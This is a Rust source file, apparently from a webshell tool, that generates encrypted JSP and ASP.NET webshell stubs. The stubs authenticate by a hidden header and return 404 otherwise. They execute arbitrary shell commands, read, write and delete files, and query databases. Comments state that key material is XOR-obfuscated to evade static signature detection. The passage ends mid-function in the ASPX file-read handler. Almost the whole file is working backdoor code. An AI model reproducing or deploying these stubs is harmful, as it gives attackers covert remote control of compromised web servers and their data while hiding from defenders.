//! JSP / ASP.NET 协议 stub 模板（NativeEncoder 的 jsp/aspx 分支）。
//! 载荷协议与 PHP native 完全一致：XOR 加密 + md5 哈希分发 + formData 参数
//! + X-Debug-Key 头鉴权。手动 JSON 解析/构造（无第三方库依赖）。

/// JSP stub：Java（javax.servlet），命令 / 文件 / 探测，无 DB。
#[allow(clippy::too_many_arguments)]
pub fn jsp_stub(
    xk: &str,
    gk_hex: &str,
    token_hex: &str,
    key_hex: &str,
    h_probe: &str,
    h_exec: &str,
    h_list: &str,
    h_read: &str,
    h_write: &str,
    h_delete: &str,
    h_rename: &str,
    h_mkdir: &str,
    h_dbprobe: &str,
    h_dbquery: &str,
    aead_ikm: Option<&str>,
) -> String {
    let (codec_helpers, codec_decode, codec_encode) = match aead_ikm {
        Some(ikm) => (
            r#"static final String DSW_XK = "{AXK}";
static final byte[] DSW_IKM = DSW_hex(DSW_dec("{IKMX}", DSW_XK));
static byte[] DSW_KEY;
static {
    try { DSW_KEY = DSW_hkdf(DSW_IKM); } catch (Exception e) { DSW_KEY = new byte[32]; }
}
static final java.util.Map<String, Long> DSW_SEEN = java.util.Collections.synchronizedMap(
        new java.util.LinkedHashMap<String, Long>() {
            protected boolean removeEldestEntry(java.util.Map.Entry<String, Long> eldest) {
                return size() > 512;
            }
        });
static byte[] DSW_hex(String s) {
    byte[] out = new byte[s.length() / 2];
    for (int i = 0; i < out.length; i++) {
        out[i] = (byte) Integer.parseInt(s.substring(i * 2, i * 2 + 2), 16);
    }
    return out;
}
static String DSW_hexstr(byte[] b, int n) {
    StringBuilder sb = new StringBuilder();
    for (int i = 0; i < n; i++) sb.append(String.format("%02x", b[i]));
    return sb.toString();
}
static byte[] DSW_cat(byte[] a, byte[] b, byte[] c) {
    byte[] out = new byte[a.length + b.length + c.length];
    System.arraycopy(a, 0, out, 0, a.length);
    System.arraycopy(b, 0, out, a.length, b.length);
    System.arraycopy(c, 0, out, a.length + b.length, c.length);
    return out;
}
static byte[] DSW_hmac(byte[] key, byte[] data) throws Exception {
    javax.crypto.Mac mac = javax.crypto.Mac.getInstance("HmacSHA256");
    mac.init(new javax.crypto.spec.SecretKeySpec(key, "HmacSHA256"));
    return mac.doFinal(data);
}
static byte[] DSW_hkdf(byte[] ikm) throws Exception {
    byte[] prk = DSW_hmac("dosword/aead/v2".getBytes("UTF-8"), ikm);
    return DSW_hmac(prk, DSW_cat("dsw2".getBytes("UTF-8"), new byte[] { 1 }, new byte[0]));
}
static byte[] DSW_aeadOpen(byte[] frame) throws Exception {
    if (frame.length < 36) throw new Exception("bad frame");
    byte[] nonce = java.util.Arrays.copyOfRange(frame, 0, 12);
    byte[] sb = java.util.Arrays.copyOfRange(frame, 12, 20);
    long seq = java.nio.ByteBuffer.wrap(sb).getLong();
    String sid = DSW_hexstr(nonce, 8);
    synchronized (DSW_SEEN) {
        Long last = DSW_SEEN.get(sid);
        if (last != null && seq <= last.longValue()) throw new Exception("replay");
    }
    javax.crypto.Cipher c = javax.crypto.Cipher.getInstance("AES/GCM/NoPadding");
    c.init(javax.crypto.Cipher.DECRYPT_MODE,
            new javax.crypto.spec.SecretKeySpec(DSW_KEY, "AES"),
            new javax.crypto.spec.GCMParameterSpec(128, nonce));
    c.updateAAD(DSW_cat("dsw2".getBytes("UTF-8"), new byte[] { 1 }, sb));
    byte[] plain = c.doFinal(frame, 20, frame.length - 20);
    synchronized (DSW_SEEN) { DSW_SEEN.put(sid, Long.valueOf(seq)); }
    return plain;
}
static byte[] DSW_aeadSeal(byte[] data) throws Exception {
    byte[] nonce = new byte[12];
    new java.security.SecureRandom().nextBytes(nonce);
    byte[] sb = java.nio.ByteBuffer.allocate(8).putLong(System.nanoTime()).array();
    javax.crypto.Cipher c = javax.crypto.Cipher.getInstance("AES/GCM/NoPadding");
    c.init(javax.crypto.Cipher.ENCRYPT_MODE,
            new javax.crypto.spec.SecretKeySpec(DSW_KEY, "AES"),
            new javax.crypto.spec.GCMParameterSpec(128, nonce));
    c.updateAAD(DSW_cat("dsw2".getBytes("UTF-8"), new byte[] { 2 }, sb));
    byte[] ct = c.doFinal(data);
    byte[] out = new byte[12 + 8 + ct.length];
    System.arraycopy(nonce, 0, out, 0, 12);
    System.arraycopy(sb, 0, out, 12, 8);
    System.arraycopy(ct, 0, out, 20, ct.length);
    return out;
}"#
            // IKM（= SHA256(密码) 的十六进制）以 XOR 形式嵌入：避免静态特征直接命中
            .replace("{IKMX}", &crate::encoder::xor_hex(ikm, xk))
            .replace("{AXK}", xk)
            .to_string(),
            r#"String req = new String(DSW_aeadOpen(java.util.Base64.getDecoder().decode(fd)), StandardCharsets.UTF_8);"#.to_string(),
            r#"out.print("{\"data\":\"" + java.util.Base64.getEncoder().encodeToString(DSW_aeadSeal(outv.getBytes(StandardCharsets.UTF_8))) + "\",\"code\":200}");"#.to_string(),
        ),
        None => (
            r#"static byte[] DSW_xor(byte[] d, byte[] k) {
    byte[] out = new byte[d.length];
    for (int i = 0; i < d.length; i++) out[i] = (byte) (d[i] ^ k[i % k.length]);
    return out;
}"#
            .to_string(),
            format!(
                "byte[] key = DSW_dec(\"{KEY}\", xk).getBytes(StandardCharsets.UTF_8);\nbyte[] in = java.util.Base64.getDecoder().decode(fd);\nbyte[] plain = DSW_xor(in, key);\nString req = new String(plain, StandardCharsets.UTF_8);",
                KEY = key_hex
            ),
            r#"byte[] resp = DSW_xor(outv.getBytes(StandardCharsets.UTF_8), key);
out.print("{\"data\":\"" + java.util.Base64.getEncoder().encodeToString(resp) + "\",\"code\":200}");"#.to_string(),
        ),
    };
    format!(
        r#"<%@ page import="java.io.*,java.util.*,java.nio.charset.*" %>
<%@ page contentType="text/html;charset=utf-8" %>
<%!
static String DSW_dec(String hex, String k) {{
    StringBuilder out = new StringBuilder();
    for (int i = 0; i < hex.length(); i += 2) {{
        int v = Integer.parseInt(hex.substring(i, i + 2), 16) ^ (int) k.charAt((i / 2) % k.length());
        out.append((char) v);
    }}
    return out.toString();
}}
{codec_helpers}
static String DSW_md5(String s) {{
    try {{
        java.security.MessageDigest md = java.security.MessageDigest.getInstance("MD5");
        byte[] d = md.digest(s.getBytes(StandardCharsets.UTF_8));
        StringBuilder sb = new StringBuilder();
        for (byte b : d) sb.append(String.format("%02x", b));
        return sb.toString();
    }} catch (Exception e) {{ return ""; }}
}}
static String DSW_val(String json, String key) {{
    String mark = "\"" + key + "\":\"";
    int i = json.indexOf(mark);
    if (i < 0) return "";
    i += mark.length();
    StringBuilder out = new StringBuilder();
    while (i < json.length()) {{
        char c = json.charAt(i);
        if (c == '\\' && i + 1 < json.length()) {{ out.append(json.charAt(i + 1)); i += 2; continue; }}
        if (c == '"') break;
        out.append(c);
        i++;
    }}
    return out.toString();
}}
static String DSW_esc(String s) {{
    if (s == null) return "";
    return s.replace("\\", "\\\\").replace("\"", "\\\"").replace("\r", "\\r").replace("\n", "\\n").replace("\t", "\\t");
}}
static String DSW_env() {{
    try {{
        String cwd = System.getProperty("user.dir", "");
        return "{{\"ok\":true,\"data\":{{\"server\":\"" + DSW_esc(System.getProperty("os.name", "") + " " + System.getProperty("os.version", "") + " " + System.getProperty("os.arch", "")) + "\",\"web_server\":\"JSP\",\"php_version\":\"\",\"current_dir\":\"" + DSW_esc(cwd) + "\",\"separator\":\"\\\\\",\"info\":{{\"ProtoVersion\":\"2\",\"Capabilities\":\"chunked,stream,db,plugin,exec\",\"ShellType\":\"file\"}}}}}}";
    }} catch (Exception e) {{ return "{{\"ok\":false,\"error\":\"env failed\"}}"; }}
}}
static String DSW_exec(String c, String w) {{
    try {{
        if (c.matches("^\\s*cd\\s+\\S+.*")) {{
            String target = c.replaceFirst("^\\s*cd\\s+", "").trim();
            String nw = new File(target).isAbsolute() ? new File(target).getAbsolutePath()
                    : new File(w != null && !w.isEmpty() ? w : ".", target).getAbsolutePath();
            return "{{\"ok\":true,\"data\":{{\"stdout\":\"\",\"cwd\":\"" + DSW_esc(nw) + "\"}}}}";
        }}
        String os = System.getProperty("os.name", "").toLowerCase();
        ProcessBuilder pb = os.contains("win") ? new ProcessBuilder("cmd", "/c", c) : new ProcessBuilder("/bin/sh", "-c", c);
        pb.redirectErrorStream(true);
        if (w != null && !w.isEmpty()) {{ File d = new File(w); if (d.isDirectory()) pb.directory(d); }}
        Process p = pb.start();
        java.io.ByteArrayOutputStream bos = new java.io.ByteArrayOutputStream();
        InputStream is = p.getInputStream();
        byte[] buf = new byte[8192];
        int n;
        while ((n = is.read(buf)) > 0) bos.write(buf, 0, n);
        p.waitFor();
        String out = java.util.Base64.getEncoder().encodeToString(bos.toByteArray());
        return "{{\"ok\":true,\"data\":{{\"stdout\":\"" + out + "\",\"cwd\":\"" + DSW_esc(System.getProperty("user.dir", "")) + "\"}}}}";
    }} catch (Exception e) {{ return "{{\"ok\":false,\"error\":\"exec failed\"}}"; }}
}}
static String DSW_list(String p) {{
    try {{
        File f = new File(p.length() == 0 ? "." : p);
        File[] items = f.listFiles();
        StringBuilder sb = new StringBuilder("{{\"ok\":true,\"data\":{{\"entries\":[");
        if (items != null) {{
            boolean first = true;
            for (File x : items) {{
                if (!first) sb.append(",");
                first = false;
                sb.append("{{\"name\":\"").append(DSW_esc(x.getName())).append("\",\"path\":\"").append(DSW_esc(x.getAbsolutePath())).append("\",\"is_dir\":").append(x.isDirectory()).append(",\"size\":").append(x.isDirectory() ? 0 : x.length()).append(",\"mtime\":").append(x.lastModified() / 1000).append("}}");
            }}
        }}
        sb.append("]}}}}");
        return sb.toString();
    }} catch (Exception e) {{ return "{{\"ok\":false,\"error\":\"list failed\"}}"; }}
}}
static String DSW_read(String p, String o, String l) {{
    try {{
        long off = (o == null || o.isEmpty()) ? 0 : Long.parseLong(o);
        long len = (l == null || l.isEmpty()) ? -1 : Long.parseLong(l);
        java.io.RandomAccessFile f = new java.io.RandomAccessFile(p, "r");
        f.seek(off);
        byte[] buf;
        long remain = f.length() - off;
        long want = len >= 0 ? Math.min(len, remain) : remain;
        if (want > Integer.MAX_VALUE) {{
            f.close();
            return "{{\"ok\":false,\"error\":\"file too large\"}}";
        }}
        buf = new byte[(int) want];
        f.readFully(buf);
        f.close();
        return "{{\"ok\":true,\"data\":\"" + java.util.Base64.getEncoder().encodeToString(buf) + "\"}}";
    }} catch (Exception e) {{ return "{{\"ok\":false,\"error\":\"read failed\"}}"; }}
}}
static String DSW_write(String p, String d, String o) {{
    try {{
        byte[] data = java.util.Base64.getDecoder().decode(d);
        long off = (o == null || o.isEmpty()) ? 0 : Long.parseLong(o);
        java.io.RandomAccessFile f = new java.io.RandomAccessFile(p, "rw");
        f.seek(off);
        f.write(data);
        f.close();
        return "{{\"ok\":true,\"data\":null}}";
    }} catch (Exception e) {{ return "{{\"ok\":false,\"error\":\"write failed\"}}"; }}
}}

static String DSW_del(String p) {{
    try {{
        File f = new File(p);
        boolean ok = f.isDirectory() ? f.delete() : f.delete();
        if (f.isDirectory() && !ok) {{
            File[] children = f.listFiles();
            if (children != null) for (File c : children) c.delete();
            ok = f.delete();
        }}
        return ok ? "{{\"ok\":true,\"data\":null}}" : "{{\"ok\":false,\"error\":\"delete failed\"}}";
    }} catch (Exception e) {{ return "{{\"ok\":false,\"error\":\"delete failed\"}}"; }}
}}
static String DSW_ren(String f, String t) {{
    return new File(f).renameTo(new File(t)) ? "{{\"ok\":true,\"data\":null}}" : "{{\"ok\":false,\"error\":\"rename failed\"}}";
}}
static String DSW_mkdir(String p) {{
    return new File(p).mkdirs() ? "{{\"ok\":true,\"data\":null}}" : "{{\"ok\":false,\"error\":\"mkdir failed\"}}";
}}
static String DSW_dbprobe(String c) {{
    try {{
        String drv = DSW_json_get(c, "driver");
        String host = DSW_json_get(c, "host");
        String port = DSW_json_get(c, "port");
        String user = DSW_json_get(c, "username");
        String pass = DSW_json_get(c, "password");
        String url;
        if (drv.equals("mysql")) {{ url = "jdbc:mysql://" + host + ":" + (port.isEmpty() ? "3306" : port) + "/"; Class.forName("com.mysql.cj.jdbc.Driver"); }}
        else if (drv.equals("pgsql")) {{ url = "jdbc:postgresql://" + host + ":" + (port.isEmpty() ? "5432" : port) + "/"; Class.forName("org.postgresql.Driver"); }}
        else return "{{\"ok\":false,\"error\":\"unsupported driver: " + drv + "\"}}";
        java.sql.Connection conn = java.sql.DriverManager.getConnection(url, user, pass);
        java.sql.Statement st = conn.createStatement();
        java.sql.ResultSet rs = st.executeQuery("SHOW DATABASES");
        StringBuilder dbs = new StringBuilder("[");
        boolean first = true;
        while (rs.next()) {{
            if (!first) dbs.append(",");
            String n = rs.getString(1);
            dbs.append("\"").append(n.replace("\\", "\\\\").replace("\"", "\\\"")).append("\"");
            first = false;
        }}
        dbs.append("]");
        rs.close(); st.close(); conn.close();
        return "{{\"ok\":true,\"data\":{{\"databases\":" + dbs + "}}}}";
    }} catch (Exception e) {{ return "{{\"ok\":false,\"error\":\"db probe failed: " + e.getMessage() + "\"}}"; }}
}}
static String DSW_dbquery(String c, String q) {{
    try {{
        String drv = DSW_json_get(c, "driver");
        String host = DSW_json_get(c, "host");
        String port = DSW_json_get(c, "port");
        String user = DSW_json_get(c, "username");
        String pass = DSW_json_get(c, "password");
        String db = DSW_json_get(c, "dbname");
        String url;
        if (drv.equals("mysql")) {{ url = "jdbc:mysql://" + host + ":" + (port.isEmpty() ? "3306" : port) + "/" + db; Class.forName("com.mysql.cj.jdbc.Driver"); }}
        else if (drv.equals("pgsql")) {{ url = "jdbc:postgresql://" + host + ":" + (port.isEmpty() ? "5432" : port) + "/" + db; Class.forName("org.postgresql.Driver"); }}
        else return "{{\"ok\":false,\"error\":\"unsupported driver: " + drv + "\"}}";
        java.sql.Connection conn = java.sql.DriverManager.getConnection(url, user, pass);
        java.sql.Statement st = conn.createStatement();
        boolean hasRs = st.execute(q);
        if (hasRs) {{
            java.sql.ResultSet rs = st.getResultSet();
            java.sql.ResultSetMetaData md = rs.getMetaData();
            int cols = md.getColumnCount();
            StringBuilder colsJson = new StringBuilder("[");
            for (int i = 1; i <= cols; i++) {{ if (i > 1) colsJson.append(","); colsJson.append("\"").append(md.getColumnLabel(i).replace("\\", "\\\\").replace("\"", "\\\"")).append("\""); }}
            colsJson.append("]");
            StringBuilder rowsJson = new StringBuilder("[");
            boolean firstRow = true;
            while (rs.next()) {{
                if (!firstRow) rowsJson.append(",");
                StringBuilder row = new StringBuilder("[");
                for (int i = 1; i <= cols; i++) {{
                    if (i > 1) row.append(",");
                    Object v = rs.getObject(i);
                    if (v == null) row.append("null");
                    else row.append("\"").append(String.valueOf(v).replace("\\", "\\\\").replace("\"", "\\\"")).append("\"");
                }}
                row.append("]");
                rowsJson.append(row);
                firstRow = false;
            }}
            rowsJson.append("]");
            rs.close();
            return "{{\"ok\":true,\"data\":{{\"columns\":" + colsJson + ",\"rows\":" + rowsJson + ",\"affected\":0}}}}";
        }} else {{
            int affected = st.getUpdateCount();
            st.close(); conn.close();
            return "{{\"ok\":true,\"data\":{{\"columns\":[],\"rows\":[],\"affected\":" + affected + "}}}}";
        }}
    }} catch (Exception e) {{ return "{{\"ok\":false,\"error\":\"db query failed: " + e.getMessage() + "\"}}"; }}
}}
static String DSW_json_get(String json, String key) {{
    String pat = "\"" + key + "\":\"";
    int idx = json.indexOf(pat);
    if (idx < 0) return "";
    int start = idx + pat.length();
    int end = json.indexOf("\"", start);
    if (end < 0) return "";
    return json.substring(start, end).replace("\\\"", "\"").replace("\\\\", "\\");
}}
%>
<%
String xk = "{xk}";
String token = request.getHeader(DSW_dec("{gk}", xk));
if (token == null || !token.equals(DSW_dec("{token}", xk))) {{ response.setStatus(404); return; }}
String fd = request.getParameter("formData");
if (fd == null) return;
{codec_decode}
String action = DSW_val(req, "a");
long h = Long.parseLong(DSW_md5(action).substring(0, 8), 16);
String outv = "{{\"ok\":false,\"error\":\"unsupported\"}}";
if (h == {h_probe}) outv = DSW_env();
else if (h == {h_exec}) outv = DSW_exec(DSW_val(req, "c"), DSW_val(req, "w"));
else if (h == {h_list}) outv = DSW_list(DSW_val(req, "p"));
else if (h == {h_read}) outv = DSW_read(DSW_val(req, "p"), DSW_val(req, "o"), DSW_val(req, "l"));
else if (h == {h_write}) outv = DSW_write(DSW_val(req, "p"), DSW_val(req, "d"), DSW_val(req, "o"));
else if (h == {h_delete}) outv = DSW_del(DSW_val(req, "p"));
else if (h == {h_rename}) outv = DSW_ren(DSW_val(req, "f"), DSW_val(req, "t"));
else if (h == {h_mkdir}) outv = DSW_mkdir(DSW_val(req, "p"));
else if (h == {h_dbprobe}) outv = DSW_dbprobe(DSW_val(req, "c"));
else if (h == {h_dbquery}) outv = DSW_dbquery(DSW_val(req, "c"), DSW_val(req, "q"));
{codec_encode}
%>
"#,
        xk = xk,
        gk = gk_hex,
        token = token_hex,
        h_probe = h_probe,
        h_exec = h_exec,
        h_list = h_list,
        h_read = h_read,
        h_write = h_write,
        h_delete = h_delete,
        h_rename = h_rename,
        h_mkdir = h_mkdir,
        h_dbprobe = h_dbprobe,
        h_dbquery = h_dbquery,
        codec_helpers = codec_helpers,
        codec_decode = codec_decode,
        codec_encode = codec_encode,
    )
}

/// ASP.NET stub：C#（aspx），命令 / 文件 / 探测，无 DB。
#[allow(clippy::too_many_arguments)]
pub fn aspx_stub(
    xk: &str,
    gk_hex: &str,
    token_hex: &str,
    key_hex: &str,
    h_probe: &str,
    h_exec: &str,
    h_list: &str,
    h_read: &str,
    h_write: &str,
    h_delete: &str,
    h_rename: &str,
    h_mkdir: &str,
    aead_ikm: Option<&str>,
) -> String {
    let (codec_helpers, codec_decode, codec_encode) = match aead_ikm {
        Some(ikm) => (
            r#"static readonly string DSW_XK = "{AXK}";
static readonly byte[] DSW_IKM = DSW_hex(DSW_dec("{IKMX}", DSW_XK));
static readonly byte[] DSW_KEY = DSW_hkdf(DSW_IKM);
static readonly System.Collections.Generic.Dictionary<string, long> DSW_SEEN = new System.Collections.Generic.Dictionary<string, long>();
static byte[] DSW_hex(string s) {
    byte[] o = new byte[s.Length / 2];
    for (int i = 0; i < o.Length; i++) o[i] = Convert.ToByte(s.Substring(i * 2, 2), 16);
    return o;
}
static string DSW_hexstr(byte[] b, int n) {
    var sb = new System.Text.StringBuilder();
    for (int i = 0; i < n; i++) sb.Append(b[i].ToString("x2"));
    return sb.ToString();
}
static byte[] DSW_join(params byte[][] parts) {
    int n = 0;
    foreach (var p in parts) n += p.Length;
    byte[] o = new byte[n];
    int k = 0;
    foreach (var p in parts) { System.Buffer.BlockCopy(p, 0, o, k, p.Length); k += p.Length; }
    return o;
}
static byte[] DSW_pad(byte[] data) {
    int r = data.Length % 16;
    return r == 0 ? new byte[0] : new byte[16 - r];
}
static byte[] DSW_hmac(byte[] key, byte[] data) {
    using (var h = new System.Security.Cryptography.HMACSHA256(key)) { return h.ComputeHash(data); }
}
static byte[] DSW_hkdf(byte[] ikm) {
    byte[] prk = DSW_hmac(Encoding.UTF8.GetBytes("dosword/aead/v2"), ikm);
    return DSW_hmac(prk, DSW_join(Encoding.UTF8.GetBytes("dsw2"), new byte[] { 1 }, new byte[0]));
}
static byte[] DSW_aesBlock(byte[] key, byte[] block) {
    using (var aes = System.Security.Cryptography.Aes.Create()) {
        aes.Mode = System.Security.Cryptography.CipherMode.ECB;
        aes.Padding = System.Security.Cryptography.PaddingMode.None;
        aes.Key = key;
        using (var enc = aes.CreateEncryptor()) { return enc.TransformFinalBlock(block, 0, 16); }
    }
}
static byte[] DSW_ctr(byte[] nonce, byte[] input) {
    byte[] o = new byte[input.Length];
    byte[] counter = new byte[16];
    System.Buffer.BlockCopy(nonce, 0, counter, 0, 12);
    // GCM：首个密钥流块使用 J0+1（低 32 位计数器从 2 开始）
    for (int off = 0, block = 2; off < input.Length; off += 16, block++) {
        counter[12] = (byte)(block >> 24); counter[13] = (byte)(block >> 16);
        counter[14] = (byte)(block >> 8); counter[15] = (byte)block;
        byte[] ks = DSW_aesBlock(DSW_KEY, counter);
        int n = Math.Min(16, input.Length - off);
        for (int i = 0; i < n; i++) o[off + i] = (byte)(input[off + i] ^ ks[i]);
    }
    return o;
}
static void DSW_gf_mul(byte[] x, byte[] y) {
    byte[] z = new byte[16];
    byte[] v = (byte[])y.Clone();
    for (int i = 0; i < 128; i++) {
        if ((x[i / 8] & (0x80 >> (i % 8))) != 0) { for (int j = 0; j < 16; j++) z[j] ^= v[j]; }
        bool lsb = (v[15] & 1) != 0;
        for (int j = 15; j > 0; j--) v[j] = (byte)((v[j] >> 1) | ((v[j - 1] & 1) << 7));
        v[0] >>= 1;
        if (lsb) v[0] ^= 0xe1;
    }
    System.Buffer.BlockCopy(z, 0, x, 0, 16);
}
static byte[] DSW_ghash(byte[] h, byte[] aad, byte[] ct) {
    byte[] y = new byte[16];
    byte[] lengths = new byte[16];
    long ab = (long)aad.Length * 8, cb = (long)ct.Length * 8;
    for (int i = 0; i < 8; i++) { lengths[i] = (byte)(ab >> (56 - i * 8)); lengths[8 + i] = (byte)(cb >> (56 - i * 8)); }
    byte[] data = DSW_join(aad, DSW_pad(aad), ct, DSW_pad(ct), lengths);
    for (int off = 0; off < data.Length; off += 16) {
        for (int i = 0; i < 16; i++) y[i] ^= data[off + i];
        DSW_gf_mul(y, h);
    }
    return y;
}
static byte[] DSW_gcmTag(byte[] nonce, byte[] ct, byte[] aad) {
    byte[] h = DSW_aesBlock(DSW_KEY, new byte[16]);
    byte[] j0 = DSW_join(nonce, new byte[] { 0, 0, 0, 1 }, new byte[0]);
    byte[] s = DSW_ghash(h, aad, ct);
    byte[] tag = DSW_aesBlock(DSW_KEY, j0);
    for (int i = 0; i < 16; i++) tag[i] ^= s[i];
    return tag;
}
static byte[] DSW_aeadSeal(byte[] data) {
    byte[] nonce = new byte[12];
    using (var rng = System.Security.Cryptography.RandomNumberGenerator.Create()) { rng.GetBytes(nonce); }
    long seq = System.Diagnostics.Stopwatch.GetTimestamp();
    byte[] sb = new byte[8];
    for (int i = 0; i < 8; i++) sb[i] = (byte)(seq >> (56 - i * 8));
    byte[] aad = DSW_join(Encoding.UTF8.GetBytes("dsw2"), new byte[] { 2 }, sb);
    byte[] ct = DSW_ctr(nonce, data);
    return DSW_join(nonce, sb, ct, DSW_gcmTag(nonce, ct, aad));
}
static byte[] DSW_aeadOpen(byte[] frame) {
    if (frame.Length < 36) throw new Exception("bad frame");
    byte[] nonce = new byte[12]; System.Buffer.BlockCopy(frame, 0, nonce, 0, 12);
    byte[] sb = new byte[8]; System.Buffer.BlockCopy(frame, 12, sb, 0, 8);
    long seq = 0; for (int i = 0; i < 8; i++) seq = (seq << 8) | sb[i];
    string sid = DSW_hexstr(nonce, 8);
    lock (DSW_SEEN) {
        long last;
        if (DSW_SEEN.TryGetValue(sid, out last) && seq <= last) throw new Exception("replay");
    }
    byte[] rest = new byte[frame.Length - 20]; System.Buffer.BlockCopy(frame, 20, rest, 0, rest.Length);
    byte[] ct = new byte[rest.Length - 16]; System.Buffer.BlockCopy(rest, 0, ct, 0, ct.Length);
    byte[] tag = new byte[16]; System.Buffer.BlockCopy(rest, ct.Length, tag, 0, 16);
    byte[] aad = DSW_join(Encoding.UTF8.GetBytes("dsw2"), new byte[] { 1 }, sb);
    byte[] exp = DSW_gcmTag(nonce, ct, aad);
    int diff = 0; for (int i = 0; i < 16; i++) diff |= exp[i] ^ tag[i];
    if (diff != 0) throw new Exception("aead auth failed");
    byte[] plain = DSW_ctr(nonce, ct);
    lock (DSW_SEEN) { DSW_SEEN[sid] = seq; if (DSW_SEEN.Count > 512) DSW_SEEN.Clear(); }
    return plain;
}"#
            // IKM（= SHA256(密码) 的十六进制）以 XOR 形式嵌入：避免静态特征直接命中
            .replace("{IKMX}", &crate::encoder::xor_hex(ikm, xk))
            .replace("{AXK}", xk)
            .to_string(),
            r#"string req = Encoding.UTF8.GetString(DSW_aeadOpen(Convert.FromBase64String(fd)));"#.to_string(),
            r#"Response.Write("{\"data\":\"" + Convert.ToBase64String(DSW_aeadSeal(Encoding.UTF8.GetBytes(outv))) + "\",\"code\":200}");"#.to_string(),
        ),
        None => (
            r#"static byte[] DSW_xor(byte[] d, byte[] k) {
    byte[] o = new byte[d.Length];
    for (int i = 0; i < d.Length; i++) o[i] = (byte) (d[i] ^ k[i % k.Length]);
    return o;
}"#
            .to_string(),
            format!(
                "byte[] key = Encoding.UTF8.GetBytes(DSW_dec(\"{KEY}\", xk));\nbyte[] inb = Convert.FromBase64String(fd);\nbyte[] plain = DSW_xor(inb, key);\nstring req = Encoding.UTF8.GetString(plain);",
                KEY = key_hex
            ),
            r#"byte[] resp = DSW_xor(Encoding.UTF8.GetBytes(outv), key);
Response.Write("{\"data\":\"" + Convert.ToBase64String(resp) + "\",\"code\":200}");"#.to_string(),
        ),
    };
    format!(
        r#"<%@ Page Language="C#" %>
<%@ Import Namespace="System" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Text" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.Security.Cryptography" %>
<script runat="server">
static string DSW_dec(string hex, string k) {{
    StringBuilder sb = new StringBuilder();
    for (int i = 0; i < hex.Length; i += 2) {{
        int v = Convert.ToInt32(hex.Substring(i, 2), 16) ^ (int) k[i / 2 % k.Length];
        sb.Append((char) v);
    }}
    return sb.ToString();
}}
{codec_helpers}
static string DSW_md5(string s) {{
    using (MD5 md = MD5.Create()) {{
        byte[] d = md.ComputeHash(Encoding.UTF8.GetBytes(s));
        StringBuilder sb = new StringBuilder();
        foreach (byte b in d) sb.Append(b.ToString("x2"));
        return sb.ToString();
    }}
}}
static string DSW_val(string json, string key) {{
    string mark = "\"" + key + "\":\"";
    int i = json.IndexOf(mark, StringComparison.Ordinal);
    if (i < 0) return "";
    i += mark.Length;
    StringBuilder o = new StringBuilder();
    while (i < json.Length) {{
        char c = json[i];
        if (c == '\\' && i + 1 < json.Length) {{ o.Append(json[i + 1]); i += 2; continue; }}
        if (c == '"') break;
        o.Append(c);
        i++;
    }}
    return o.ToString();
}}
static string DSW_esc(string s) {{
    if (s == null) return "";
    return s.Replace("\\", "\\\\").Replace("\"", "\\\"").Replace("\r", "\\r").Replace("\n", "\\n").Replace("\t", "\\t");
}}
static string DSW_env() {{
    try {{ return "{{\"ok\":true,\"data\":{{\"server\":\"" + DSW_esc(Environment.OSVersion.VersionString) + "\",\"web_server\":\"ASP.NET\",\"php_version\":\"\",\"current_dir\":\"" + DSW_esc(Directory.GetCurrentDirectory()) + "\",\"separator\":\"\\\\\",\"info\":{{\"ProtoVersion\":\"2\",\"Capabilities\":\"chunked,stream,plugin,exec\",\"ShellType\":\"file\"}}}}}}"; }}
    catch (Exception) {{ return "{{\"ok\":false,\"error\":\"env failed\"}}"; }}
}}
static string DSW_exec(string c, string w) {{
    try {{
        if (System.Text.RegularExpressions.Regex.IsMatch(c, "^\\s*cd\\s+\\S+.*")) {{
            string target = System.Text.RegularExpressions.Regex.Replace(c, "^\\s*cd\\s+", "").Trim();
            string nw = Path.IsPathRooted(target) ? Path.GetFullPath(target) : Path.GetFullPath(Path.Combine(string.IsNullOrEmpty(w) ? "." : w, target));
            return "{{\"ok\":true,\"data\":{{\"stdout\":\"\",\"cwd\":\"" + DSW_esc(nw) + "\"}}}}";
        }}
        ProcessStartInfo psi = new ProcessStartInfo(Environment.OSVersion.Platform.ToString().StartsWith("Win") ? "cmd.exe" : "/bin/sh", Environment.OSVersion.Platform.ToString().StartsWith("Win") ? "/c " + c : "-c " + c);
        psi.RedirectStandardOutput = true;
        psi.UseShellExecute = false;
        if (!string.IsNullOrEmpty(w) && Directory.Exists(w)) psi.WorkingDirectory = w;
        Process p = Process.Start(psi);
        string o = p.StandardOutput.ReadToEnd();
        p.WaitForExit();
        return "{{\"ok\":true,\"data\":{{\"stdout\":\"" + Convert.ToBase64String(Encoding.UTF8.GetBytes(o)) + "\",\"cwd\":\"" + DSW_esc(Directory.GetCurrentDirectory()) + "\"}}}}";
    }} catch (Exception) {{ return "{{\"ok\":false,\"error\":\"exec failed\"}}"; }}
}}
static string DSW_list(string p) {{
    try {{
        DirectoryInfo dir = new DirectoryInfo(string.IsNullOrEmpty(p) ? "." : p);
        StringBuilder sb = new StringBuilder("{{\"ok\":true,\"data\":{{\"entries\":[");
        bool first = true;
        foreach (FileSystemInfo x in dir.GetFileSystemInfos()) {{
            if (!first) sb.Append(",");
            first = false;
            sb.Append("{{\"name\":\"").Append(DSW_esc(x.Name)).Append("\",\"path\":\"").Append(DSW_esc(x.FullName)).Append("\",\"is_dir\":").Append(x is DirectoryInfo).Append(",\"size\":").Append(x is FileInfo fi ? fi.Length : 0).Append(",\"mtime\":").Append((long)(x.LastWriteTimeUtc - new DateTime(1970, 1, 1)).TotalSeconds).Append("}}");
        }}
        sb.Append("]}}}}");
        return sb.ToString();
    }} catch (Exception) {{ return "{{\"ok\":false,\"error\":\"list failed\"}}"; }}
}}
static string DSW_read(string p, string o, string l) {{
    try {{
        long off = string.IsNullOrEmpty(o) ? 0 : long.Parse(o);
        long len = string.IsNullOrEmpty(l) ? -1 : long.Parse(l);
        using (var fs = File.OpenRead(p)) {{
            fs.Seek(off, SeekOrigin.Begin);
            long remain = fs.Length - off;
            long want = len >= 0 ? Math.Min(len, remain) : remain;
            if (want > int.MaxValue) return "{{\"ok\":false,\"error\":\"file too large\"}}";
            byte[] buf = new byte[(int)want];
            // fs.Read 可能短读：循环直到读满或 EOF，否则内容会被零填充
            int total = 0;
            while (total < buf.Length) {{
                int r = fs.Read(buf, total, buf.Length - total);
                if (r <= 0) break;
                total += r;
            }}
            if (total != buf.Length) Array.Resize(ref buf, total);
            return "{{\"ok\":true,\"data\":\"" + Convert.ToBase64String(buf) + "\"}}";
        }}
    }}
